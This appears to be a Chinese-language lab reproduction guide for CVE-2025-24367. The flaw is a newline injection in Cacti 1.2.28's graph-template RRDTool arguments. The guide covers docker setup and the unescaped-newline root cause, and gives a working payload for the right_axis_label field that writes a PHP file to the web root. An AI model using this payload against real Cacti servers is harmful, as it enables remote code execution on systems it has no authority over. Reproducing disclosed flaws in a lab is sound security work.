# Cacti RRDTool后台参数注入导致远程代码执行 (CVE-2025-24367)

Cacti是一款利用RRDTool数据存储和图形化功能的完整网络图形化解决方案。在Cacti 1.2.28及以前版本中存在一个命令注入漏洞，该漏洞允许已认证用户在Web服务器上创建任意PHP文件，从而可能导致远程代码执行。

此漏洞出现在图形模板功能中，用户输入的RRDTool命令参数，如`--right-axis-label`，未被正确过滤。虽然Cacti尝试使用`cacti_escapeshellarg()`函数转义shell元字符，但它未能处理换行符。这允许攻击者突破预期的命令上下文并注入其他RRDTool命令，最终能够向Web根目录写入恶意PHP文件。

参考链接：

- <https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq>
- <https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0>

## 环境搭建

执行如下命令启动Cacti 1.2.28：

```
docker compose up -d
```

服务启动后，访问http://your-ip:8080即可看到Cacti的登录界面，默认用户名密码为admin/admin。

你需要登录并按照初始化指引操作，只需点击"Next"按钮直到看到成功页面即可。

## 漏洞复现

首先，需要登录Cacti。在Cacti控制台，导航至"Console → Templates → Graph"，找到"PING - Advanced Ping"模板并编辑它。捕获这个编辑请求，然后修改`right_axis_label`参数为以下payload（请注意换行符`%0a`）：

```
XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph vulhub.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=phpinfo();?>
```

![](1.png)

然后，来到"Console → Create → New Graphs"，使用"PING - Advanced Ping"模板创建一个新图表：

![](2.png)

之后，来到"Graphs → Default Tree → Local Linux Machine"来触发payload执行。

![](3.png)

你会看到一个带有"Error: creating arguments"错误消息的图像，这意味着payload已被执行。

命令执行后，payload将在Cacti的Web根目录创建两个文件：一个RRD文件(my.rrd)和一个PHP网页shell(vulhub.php)：

![](4.png)
